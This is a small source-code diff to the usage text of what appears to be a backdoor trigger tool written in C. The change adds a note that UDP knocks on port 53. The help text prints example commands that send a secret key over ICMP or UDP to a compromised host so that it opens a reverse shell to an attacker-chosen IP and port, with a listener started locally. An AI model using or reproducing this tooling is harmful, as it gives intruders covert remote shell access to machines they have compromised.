@@ -144,7 +144,8 @@ void usage(char *argv){
 	printf("-q\tTarget Port\n");
 	printf("-d\tData to knock on backdoor: \"<key> <reverse IP> <reverse Port>\"\n");
 	printf("-l\tLaunch listener\n\n");
-	printf("%s ICMP doesn't need ports\n\n", warn);
+	printf("%s ICMP doesn't need ports\n", warn);
+	printf("%s UDP needs to knock on port 53 to activate the reverse shell\n\n", warn);
 	printf("ICMP: %s -x icmp -s 192.168.0.2 -t 192.168.0.3 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
 	printf("UDP:  %s -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n\n", argv);
 	exit(1);
